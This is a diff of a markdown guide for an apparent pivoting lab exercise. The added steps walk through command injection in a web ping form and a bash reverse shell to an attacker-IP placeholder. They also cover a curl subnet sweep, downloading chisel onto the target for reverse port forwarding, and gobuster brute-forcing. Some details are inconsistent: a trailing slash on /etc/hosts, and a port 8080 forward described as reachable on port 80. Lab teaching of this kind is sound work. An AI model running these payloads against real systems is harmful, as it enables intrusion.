@@ -330,7 +330,7 @@ Chisel’s reverse tunneling forwards internal service ports through the comprom
 
 ---
 
-### Lab 8: Pivoting Network Pivoting
+### Lab 8: Network Pivoting
 #### Objective
 Perform network pivoting to access multiple internal subnets via a compromised host.
 
@@ -338,7 +338,7 @@ Perform network pivoting to access multiple internal subnets via a compromised h
 - Network Access: Compromised host with multiple network interfaces enables pivoting.
 
 #### Requirements
-Compromised host must have access to multiple internal subnets.
+Compromised host must have access to multiple internal subnets. 
 
 #### Steps
 1. **Setup**
@@ -347,28 +347,44 @@ Compromised host must have access to multiple internal subnets.
    ping <PIVOT_IP>
    ```
 2. **Reconnaissance**
-   - Enumerate reachable subnets from the pivot host.
-   ```bash
-   ip route
-   ```
+   - Check web interface accessible on port 1337 or 1338.
+   - Website's ping functionality allows for command injection.
+   
 3. **Exploitation**
-   - Set up a SOCKS proxy using Proxychains and SSH.
+   - Start a netcat listener on your attacking machine `nc -nlvp <PORT>`.
+   - Ping this command on the web interface to get a reverse shell `; bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'`
+   - Get the internal network IP `cat /etc/hosts/`
+   - Scan the internal network subnet to find any hosts up. In our case, the internal network subnet was 172.18.0.* (172.18.0.2 was found in /etc/hosts)
    ```bash
-   ssh -D 9050 user@<PIVOT_IP>
-   proxychains nmap -sT <INTERNAL_SUBNET>
+   for ip in {1..254}; do curl --connect-timeout 1 http://172.18.0.$ip &> /dev/null && echo "172.18.0.$ip is UP" & done
    ```
-
-#### Why It Works
-The compromised host’s network interfaces allow routing of traffic to multiple internal subnets via a SOCKS proxy.
+   - Forward the identified internal network host with chisel (in our case, 172.18.0.3):
+   - Download chisel in your attacker machine, you can find it in resources/Tools.
+   ```bash
+    chmod +x chisel
+    ./chisel server -p 8989 --reverse
+   ```
+   - Server chisel over a python http server `python3 -m http.server 8000` and download it from the target machine `curl <ATTACKER-IP>:8000/chisel`
+   - Start a chisel client with port forwarding:
+   ```bash
+   chmod +x chisel
+    ./chisel client <ATTACKER-IP>:8989 R:8080:172.18.0.3:80
+   ```
+   - The internal website becomes accessible from your attacking machine on `127.0.0.1:80`
+   - Use this [web directory wordlist](https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/the_biggest_with_ext.txt) and find the directory containing the flag.
+   ```bash
+   gobuster dir -u http://127.0.0.1:80 -w wordlist.txt
+   ```
 
 #### Alternatives
-- Use Metasploit’s autoroute for network pivoting.
+- Use SSH port forwarding, or proxychains/SOCKS proxies to expose the internal website. See step by step guide in classes/day 6.
 
 #### Resources
+- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 - [Network Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
 
 #### Notes
-- Ensure proxychains is configured with the correct SOCKS port.
+- TODO
 
 ---
 
@@ -414,6 +430,6 @@ The DMZ host’s access to internal networks allows attackers to tunnel traffic 
 - [Winbox Vulnerability Dissection: https://n0p.me/winbox-bug-dissection/](https://n0p.me/winbox-bug-dissection/)
 
 #### Notes
-- TODO
+- Ensure the DMZ host allows reverse SSH connections.
 
 ---
